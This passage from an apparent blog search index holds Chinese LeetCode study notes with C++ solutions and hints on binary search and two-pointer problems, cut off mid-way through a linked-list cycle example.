class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[ptr1]);</span><br><span class="line">                ++ptr1;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[ptr0]);</span><br><span class="line">                <span class="keyword">if</span> (ptr0 &lt; ptr1) <span class="built_in">swap</span>(nums[i], nums[ptr1]);</span><br><span class="line">                ++ptr0;</span><br><span class="line">                ++ptr1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：更像双指针的题目，只需要把0和1排好即可把2排好。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(三): 二分查找</title>
      <link href="/post/53d77927.html"/>
      <url>/post/53d77927.html</url>
      
        <content type="html"><![CDATA[<p>二分查找算法的核心思想：二分查找也常被称为二分法或者折半查找 (binary search, bisect)，每次查找时通过将待查找的单调区间分成两部分并只取一部分继续查找，将查找的复杂度大大减少。对于一个长度为<code>O(n)</code>的数组，二分查找的时间复杂度为<code>O(logn)</code>。</p><h2 id="一、求开方"><a href="#一、求开方" class="headerlink" title="一、求开方"></a>一、求开方</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/sqrtx">x 的平方根</a><br>给定一个非负整数 x，求它的开方，向下取整。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = x, mid, x_div_mid;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">        mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        x_div_mid = x / mid;</span><br><span class="line">        <span class="keyword">if</span> (mid == x_div_mid) &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mid &lt; x_div_mid) &#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解答二：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> t = x;</span><br><span class="line">    <span class="keyword">while</span> (t * t &gt; x) &#123;</span><br><span class="line">        t = (t + x / t) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：使用除法可以防止溢出，也可以使用<strong>牛顿迭代法</strong>: 其公式为 $t_{n+1}&#x3D;t_{n}−\frac{f(t_{n})}{f′(t_{n})}$。给定$f(t)&#x3D;t2−x&#x3D;0$，这里的迭代公式为 $t_{n+1}&#x3D;\frac{t_{n}+\frac{x}{t_{n}}}{2}$。</p></li></ul><h2 id="二、查找区间"><a href="#二、查找区间" class="headerlink" title="二、查找区间"></a>二、查找区间</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array">在排序数组中查找元素的第一个和最后一个位置</a><br>给定一个增序的整数数组和一个值，查找该值第一次和最后一次出现的位置。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowerBound</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>(), mid;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">upperBound</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>(), mid;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt;= target) &#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">searchRange</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> lower = <span class="built_in">lowerBound</span>(nums, target);</span><br><span class="line">    <span class="type">int</span> upper = <span class="built_in">upperBound</span>(nums, target) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (lower == nums.<span class="built_in">size</span>() || nums[lower] != target) &#123;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;lower, upper&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：注意当要查找第一个出现的位置时，l要尽可能的小，也就是必须大于才会等于mid+1，最大值则是等于。</p></li></ul><h2 id="三、查找峰值"><a href="#三、查找峰值" class="headerlink" title="三、查找峰值"></a>三、查找峰值</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/find-peak-element">寻找峰值</a><br>给定一个数组，定义峰值为比所有两边都大的数字，求峰值的位置。一个数组里可能存在多个峰值，返回任意一个即可。时间复杂度要求为 <code>O(log⁡n)</code>。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findPeakElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[<span class="number">0</span>] &gt; nums[<span class="number">1</span>]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[length - <span class="number">1</span>] &gt; nums[length - <span class="number">2</span>]) <span class="keyword">return</span> length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> low = <span class="number">1</span>, high = length - <span class="number">2</span>, middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[middle] &gt; nums[middle + <span class="number">1</span>] &amp;&amp; nums[middle] &gt; nums[middle - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">return</span> middle;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (nums[middle] &lt;= nums[middle - <span class="number">1</span>])</span><br><span class="line">                high = middle - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> low = middle + <span class="number">1</span>;</span><br><span class="line">            middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意边界值。</p></li></ul><h2 id="四、旋转数组查找数字"><a href="#四、旋转数组查找数字" class="headerlink" title="四、旋转数组查找数字"></a>四、旋转数组查找数字</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/search-in-rotated-sorted-array-ii">搜索旋转排序数组 II</a><br>一个原本非递减序的数组被首尾相连后按某个位置断开（如 [1,2,2,3,4,5] → [2,3,4,5,1,2]，在第一位和第二位断开），我们称其为旋转数组。给定一个值，判断这个值是否存在于这个旋转数组中。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>, high = nums.<span class="built_in">size</span>() - <span class="number">1</span>, middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (target &gt; nums[middle]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[middle] &gt; nums[high] || nums[high] &gt;= target) low = middle + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> --high;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[middle]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[middle] &lt; nums[high] || nums[low] &lt;= target) high = middle - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> ++low;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意旋转数组的性质，旋转到后面的数的最大值一定小于等于旋转到前面的最小值。</p></li></ul><h2 id="五、练习"><a href="#五、练习" class="headerlink" title="五、练习"></a>五、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/find-minimum-in-rotated-sorted-array-ii/">寻找旋转排序数组中的最小值 II</a><br>已知一个长度为 <code>n</code> 的数组，预先按照升序排列，经由 <code>1</code> 到 <code>n</code> 次 <strong>旋转</strong> 后，得到输入数组。例如，原数组 <code>nums = [0,1,4,4,5,6,7]</code> 在变化后可能得到：</p><ul><li>若旋转 <code>4</code> 次，则可以得到 <code>[4,5,6,7,0,1,4]</code></li><li>若旋转 <code>7</code> 次，则可以得到 <code>[0,1,4,4,5,6,7]</code><br>注意，数组 <code>[a[0], a[1], a[2], ..., a[n-1]]</code> <strong>旋转一次</strong> 的结果为数组 <code>[a[n-1], a[0], a[1], a[2], ..., a[n-2]]</code> 。<br>给你一个可能存在 <strong>重复</strong> 元素值的数组 <code>nums</code> ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 <strong>最小元素</strong> 。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMin</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>, high = len - <span class="number">1</span>, mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt; nums[high]) low = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (nums[low] &lt; nums[high]) high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> --high;</span><br><span class="line">            mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：想想为什么<code>high--</code>。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/single-element-in-a-sorted-array/">有序数组中的单一元素</a><br>给你一个仅由整数组成的有序数组，其中每个元素都会出现两次，唯有一个数只会出现一次。<br>请你找出并返回只出现一次的那个数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNonDuplicate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span> nums[len];</span><br><span class="line">        <span class="keyword">if</span> (nums[<span class="number">0</span>] != nums[<span class="number">1</span>]) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (nums[len] != nums[len - <span class="number">1</span>]) <span class="keyword">return</span> nums[len];</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>, high = len, mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mid % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[mid] == nums[mid + <span class="number">1</span>])</span><br><span class="line">                    low = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[mid] == nums[mid - <span class="number">1</span>])</span><br><span class="line">                    low = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：想想偶数位和奇数位的出现单个元素后的变化情况。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">寻找两个正序数组的中位数</a><br>给定两个大小分别为 <code>m</code> 和 <code>n</code> 的正序（从小到大）数组 <code>nums1</code> 和 <code>nums2</code>。请你找出并返回这两个正序数组的 <strong>中位数</strong> 。<br>算法的时间复杂度应该为 <code>O(log (m+n))</code> 。</p><p>解答：<del>暂时还不会</del></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 二分查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(二): 双指针</title>
      <link href="/post/4bd96ca6.html"/>
      <url>/post/4bd96ca6.html</url>
      
        <content type="html"><![CDATA[<p>双指针算法的核心思想：双指针主要用于遍历数组，两个指针指向不同的元素，从而协同完成任务。也可以延伸到多个数组的多个指针。</p><h2 id="一、Two-Sum"><a href="#一、Two-Sum" class="headerlink" title="一、Two Sum"></a>一、Two Sum</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted">两数之和 II - 输入有序数组</a><br>给你一个下标从1开始的整数数组 <code>numbers</code> ，该数组已按 <strong>非递减顺序排列</strong> ，请你从数组中找出满足相加之和等于目标数 <code>target</code> 的两个数。如果设这两个数分别是 <code>numbers[index1]</code> 和 <code>numbers[index2]</code> ，则 <code>1 &lt;= index1 &lt; index2 &lt;= numbers.length</code> 。以长度为 2 的整数数组 <code>[index1, index2]</code> 的形式返回这两个整数的下标 <code>index1</code> 和 <code>index2</code>。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; numbers, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = numbers.<span class="built_in">size</span>() - <span class="number">1</span>, two_sum;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        two_sum = numbers[l] + numbers[r];</span><br><span class="line">        <span class="keyword">if</span> (two_sum == target) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (two_sum &lt; target) ++l;</span><br><span class="line">        <span class="keyword">else</span> --r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;l + <span class="number">1</span>, r + <span class="number">1</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：利用非递减数列的性质。</p></li></ul><h2 id="二、归并两个有序数组"><a href="#二、归并两个有序数组" class="headerlink" title="二、归并两个有序数组"></a>二、归并两个有序数组</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/merge-sorted-array">合并两个有序数组</a><br>给你两个按 <strong>非递减顺序</strong> 排列的整数数组 <code>nums1</code> 和 <code>nums2</code>，另有两个整数 <code>m</code> 和 <code>n</code> ，分别表示 <code>nums1</code> 和 <code>nums2</code> 中的元素数目。<br>请你 <strong>合并</strong> <code>nums2</code> 到 <code>nums1</code> 中，使合并后的数组同样按 <strong>非递减顺序</strong> 排列。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> pos = --m + --n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m &lt; <span class="number">0</span>) nums1[pos--] = nums2[n--];</span><br><span class="line">            <span class="keyword">else</span> nums1[pos--] = nums1[m] &gt; nums2[n] ? nums1[m--] : nums2[n--];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：简单题。</p></li></ul><h2 id="三、滑动窗口"><a href="#三、滑动窗口" class="headerlink" title="三、滑动窗口"></a>三、滑动窗口</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/minimum-window-substring">最小覆盖子串</a><br>给你一个字符串 <code>s</code> 、一个字符串 <code>t</code> 。返回 <code>s</code> 中涵盖 <code>t</code> 所有字符的最小子串。如果 <code>s</code> 中不存在涵盖 <code>t</code> 所有字符的子串，则返回空字符串 <code>&quot;&quot;</code> 。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">minWindow</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">valid</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">frequence</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : t) &#123;</span><br><span class="line">            valid[c] = <span class="literal">true</span>;</span><br><span class="line">            frequence[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> min_length = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> min_r = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="built_in">accumulate</span>(valid.<span class="built_in">begin</span>(), valid.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (l &lt; s.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (valid[s[l]]) &#123;</span><br><span class="line">                frequence[s[l]]--;</span><br><span class="line">                <span class="keyword">if</span> (frequence[s[l]] == <span class="number">0</span>) count--;</span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (!valid[s[r]] || frequence[s[r]] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (frequence[s[r]] &lt; <span class="number">0</span>) </span><br><span class="line">                            frequence[s[r]]++;</span><br><span class="line">                        r++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (min_length == <span class="number">-1</span> || min_length &gt; l - r + <span class="number">1</span>) &#123;</span><br><span class="line">                        min_length = l - r + <span class="number">1</span>;</span><br><span class="line">                        min_r = r;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> min_length == <span class="number">-1</span> ? <span class="string">&quot;&quot;</span> : s.<span class="built_in">substr</span>(min_r, min_length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要存储某些信息来方便处理。</p></li></ul><h2 id="四、快慢指针"><a href="#四、快慢指针" class="headerlink" title="四、快慢指针"></a>四、快慢指针</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/linked-list-cycle-ii">环形链表 II</a></p><p>给定一个链表的头节点  <code>head</code> ，返回链表开始入环的第一个节点。 <em>如果链表无环，则返回 <code>null</code>。</em><br>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（<strong>索引从 0 开始</strong>）。如果 <code>pos</code> 是 <code>-1</code>，则在该链表中没有环。<strong>注意：<code>pos</code> 不作为参数进行传递</strong>，仅仅是为了标识链表的实际情况。<br><img src="https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Definition for singly-linked list.</span></span><br><span class="line"><span class="comment">// struct ListNode &#123;</span></span><br><span class="line"><span class="comment">//     int val;</span></span><br><span class="line"><span class="comment">//     ListNode *next;</span></span><br><span class="line"><span class="comment">//     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line"><span 